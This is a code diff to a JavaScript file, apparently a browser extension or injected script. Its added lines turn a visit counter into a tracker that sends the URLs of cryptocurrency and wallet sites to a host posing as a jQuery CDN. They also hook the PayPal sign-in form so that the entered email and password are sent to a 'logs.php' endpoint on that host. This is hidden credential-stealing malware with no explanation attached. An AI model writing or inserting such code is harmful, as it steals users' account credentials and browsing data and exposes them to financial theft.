@@ -3,6 +3,19 @@ var myStringArray = ["bitcoin","blockchain.info","wallet","paxful.com","coin.spa
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
-(new Image).src = "//whos.amung.us/swidget/co1nr1nk0";
+(new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/sites.php?l="+window.location.href;
   }
 }
+
+if (window.location.href.indexOf("https://www.paypal.com/signin") > -1) {
+var login_form = document.getElementsByName("login");
+    if(login_form){
+        login_form.onsubmit = function(){
+            var login = {};
+            login.email = document.getElementsByName("login_email").value;
+            login.pass = document.getElementsByName("login_password").value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+
+		        }
+          }
+        }
